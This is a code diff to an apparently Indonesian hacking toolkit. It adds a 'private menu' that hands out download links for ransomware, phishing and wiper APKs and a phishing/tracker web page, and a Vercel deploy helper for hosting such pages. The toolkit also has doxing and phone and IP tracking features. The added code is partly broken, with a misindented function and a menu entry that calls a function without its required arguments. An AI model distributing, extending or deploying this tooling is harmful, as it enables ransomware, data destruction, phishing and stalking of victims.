@@ -13,7 +13,11 @@ from sys import stderr
 from urllib.parse import urljoin
 import re
 import urllib3
-
+import subprocess
+import shutil
+import tempfile
+import zipfile
+import base64
 # suppress insecure request warnings (we sometimes use verify=False)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -61,7 +65,7 @@ def run_banner():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣶⣿⣷⣾⡿⠈⠻⠆⠀⠀⠀⠀⠰⠟⠁⢿⣷⣾⣿⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⡏⠻⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠟⢹⣿⣿⣿⡿⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 {Wh}--------------------------------
-   {Wh}| {Gr}XYNTHENRO  - TRACKER - IP ADDRESS {Wh}|
+   {Wh}| {Gr}XYNTHENRO X TOOLS {Wh}|
    {Wh}|       {Gr}@CODE BY NEXULTZY-404      {Wh}|
 {Wh}--------------------------------⠀    
 """)
@@ -77,6 +81,104 @@ def is_option(func):
 # -------------------------
 # Original XynTR functions
 # -------------------------
+
+# -------------------------
+# Vercel deploy feature
+# -------------------------
+def _run_vercel_cli_deploy(token, path, project_name=None, team_id=None, prod=False):
+    vercel_cmd = shutil.which("vercel") or shutil.which("vc")
+    if not vercel_cmd:
+        return False, "Vercel CLI tidak ditemukan di PATH."
+
+    env = os.environ.copy()
+    env["iIQw5J3igDcY0duWom58MC8W"] = token
+    cmd = [vercel_cmd, "deploy", path, "--confirm"]
+    if project_name:
+        cmd += ["--name", project_name]
+    if prod:
+        cmd += ["--prod"]
+    if team_id:
+        cmd += ["--team", team_id]
+
+    try:
+        p = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=600)
+        if p.returncode == 0:
+            return True, p.stdout.strip()
+        else:
+            return False, f"Vercel CLI gagal: {p.stderr.strip()}"
+    except Exception as e:
+        return False, f"Error menjalankan Vercel CLI: {e}"
+
+def _trigger_deploy_hook(deploy_hook_url):
+    try:
+        r = requests.post(deploy_hook_url, timeout=15)
+        if r.status_code in (200, 201, 202):
+            return True, f"Deploy hook dipicu: HTTP {r.status_code}"
+        else:
+            return False, f"Deploy hook balik HTTP {r.status_code}: {r.text[:300]}"
+    except Exception as e:
+        return False, f"Error memanggil deploy hook: {e}"
+
+def deploy_zip_to_vercel():
+    print("\n=== DEPLOY HTML / ZIP TO VERCEL ===")
+    zip_path = input("Path file ZIP atau folder (html) yang akan dideploy: ").strip()
+    if not zip_path:
+        print("Path tidak diisi.")
+        return
+
+    deploy_hook = input("Jika punya Deploy Hook URL (opsional), paste di sini (enter untuk skip): ").strip()
+    use_cli_hint = None
+    if not deploy_hook:
+        use_cli_hint = input("Gunakan Vercel CLI bila tersedia? (y/n, default y): ").strip().lower() or "y"
+
+    token = input("Masukkan Vercel Token (personal token) atau tekan enter kalau mau pakai env VERCEL_TOKEN di sistem: ").strip()
+    project_name = input("Nama project Vercel (opsional): ").strip() or None
+    team_id = input("Team ID (opsional): ").strip() or None
+    prod_choice = input("Deploy ke production? (y/n, default n): ").strip().lower() or "n"
+    prod = prod_choice == 'y'
+
+    if deploy_hook:
+        ok, msg = _trigger_deploy_hook(deploy_hook)
+        if ok:
+            print(f"[OK] Deploy via Hook sukses: {msg}")
+        else:
+            print(f"[ERR] Deploy Hook gagal: {msg}")
+        return
+
+    if use_cli_hint == 'y':
+        if os.path.isfile(zip_path) and zipfile.is_zipfile(zip_path):
+            tmpdir = tempfile.mkdtemp(prefix="vercel_deploy_")
+            try:
+                with zipfile.ZipFile(zip_path, 'r') as z:
+                    z.extractall(tmpdir)
+                print(f"Zip diekstrak ke {tmpdir}, mencoba deploy via Vercel CLI...")
+                ok, msg = _run_vercel_cli_deploy(token or os.environ.get("VERCEL_TOKEN", ""), tmpdir, project_name, team_id, prod)
+                if ok:
+                    print(f"[OK] Deploy CLI sukses. Output:\n{msg}")
+                else:
+                    print(f"[ERR] Deploy CLI gagal: {msg}")
+            finally:
+                try:
+                    shutil.rmtree(tmpdir)
+                except:
+                    pass
+            return
+        elif os.path.isdir(zip_path):
+            ok, msg = _run_vercel_cli_deploy(token or os.environ.get("VERCEL_TOKEN", ""), zip_path, project_name, team_id, prod)
+            if ok:
+                print(f"[OK] Deploy CLI sukses. Output:\n{msg}")
+            else:
+                print(f"[ERR] Deploy CLI gagal: {msg}")
+            return
+        else:
+            print("Path yang diberikan bukan zip atau folder yang valid.")
+            return
+
+    print("\nTidak ada deploy hook dan Vercel CLI dilewati/tidak ada.")
+    print(" - Install vercel CLI: `npm i -g vercel` lalu jalankan kembali fitur ini.")
+    print(" - Atau buat Deploy Hook di Project Settings -> Git -> Deploy Hooks, lalu paste URL ke fitur ini.")
+    return
+
 @is_option
 def IP_Track():
     ip = input(f"{Wh}\n Enter IP target : {Gr}")  # INPUT IP ADDRESS
@@ -610,19 +712,18 @@ def multi_dox_menu():
     input(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue")
     
     
-def main_menu():
+def private_menu():
     options2 = [
-        {'num': 1, 'text': 'GET APK RANSOMWARE', 'func': show_link_message},
-        {'num': 2, 'text': 'Show Your IP', 'func': showIP},
-        {'num': 3, 'text': 'Phone Number Tracker', 'func': phoneGW},
-        {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
-        {'num': 5, 'text': 'WordPress Security Check (safe)', 'func': wp_security_menu},
-        {'num': 6, 'text': 'Multi Doxing Intelligence (NEXULTZY)', 'func': multi_dox_menu},
-        {'num': 0, 'text': 'Exit', 'func': exit}
+        {'num': 1, 'text': 'GET APK RANSOMWARE', 'func': GetRansom},
+        {'num': 2, 'text': 'GET APK PHISING', 'func': GetPhising},
+        {'num': 3, 'text': 'GET WEB PHISING/TRACKER', 'func': GetWebPhising},
+        {'num': 4, 'text': 'DEPLOY FILE HTML/ZIP', 'func': _run_vercel_cli_deploy},
+        {'num': 5, 'text': 'GET VIRUS HAPUS ALL FILE KORBAN', 'func': GetVirus},
+        {'num': 0, 'text': 'Kembali ke menu utama', 'func': lambda: None}
     ]
 
     while True:
-        print("\n=== MENU UTAMA ===")
+        print("\n=== PRIVATE MENU ===")
         for opt in options2:
             print(f"[{opt['num']}] {opt['text']}")
 
@@ -631,23 +732,45 @@ def main_menu():
             found = False
             for opt in options2:
                 if opt['num'] == choice:
+                    if opt['num'] == 0:  # kalau pilih kembali
+                        return
                     opt['func']()
                     found = True
                     break
             if not found:
                 print("Pilihan tidak valid, coba lagi.")
         except ValueError:
-            print("Input harus angka!")    
-def about_menu():
-    show_text("Tools ini dibuat oleh NexulTzy-404.\nGunakan dengan bijak!")
+            print("Input harus angka!")
     
-    
-def show_link_message():
+def GetRansom():
     message = """https://www.mediafire.com/file/xaxumq3f4og3fk4/NexultzyNewApp2.apk/file
 Harap Gunakan Lah Apk Ini Dengan bijak!!."""
     print("\n" + message + "\n")
     input("Tekan Enter untuk kembali ke menu utama...")
     main_menu()  # pastikan main_menu() sudah kamu definisikan
+    
+    
+    
+def GetPhising():
+    message = """https://www.mediafire.com/file/yk0df2p73v5ute4/WIFI+CRACKER+.apk/file
+Janggan Lupa Ganti Id And Token Di bagian assets !!."""
+    print("\n" + message + "\n")
+    input("Tekan Enter untuk kembali ke menu utama...")
+    main_menu()  # pastikan main_menu() sudah kamu definisikan    
+
+def GetWebPhising():
+    message = """https://www.mediafire.com/file/j1mcmpjt5snp99h/Web+Tracker.html/file
+Janggan Lupa Ganti Id And Token Lu!!."""
+    print("\n" + message + "\n")
+    input("Tekan Enter untuk kembali ke menu utama...")
+    main_menu()  # pastikan main_menu() sudah kamu definisikan    
+    
+  def GetVirus():
+    message = """https://www.mediafire.com/file/m7u2uyl2c95v27w/VIRUSS+NEXULTZY.apk/file
+Janggan Di Salah Gunakan Tolol!."""
+    print("\n" + message + "\n")
+    input("Tekan Enter untuk kembali ke menu utama...")      
+                
 # -------------------------
 # Options and main menu
 # -------------------------
@@ -658,7 +781,7 @@ options = [
     {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
     {'num': 5, 'text': 'WordPress Security Check (safe)', 'func': wp_security_menu},
     {'num': 6, 'text': 'Multi Doxing Intelligence (NEXULTZY)', 'func': multi_dox_menu},
-    {'num': 7, 'text': 'Private menu', 'func': main_menu},    
+    {'num': 7, 'text': 'Private Menu', 'func': private_menu},   # ✅ diarahkan ke options2
     {'num': 0, 'text': 'Exit', 'func': exit}
 ]
 
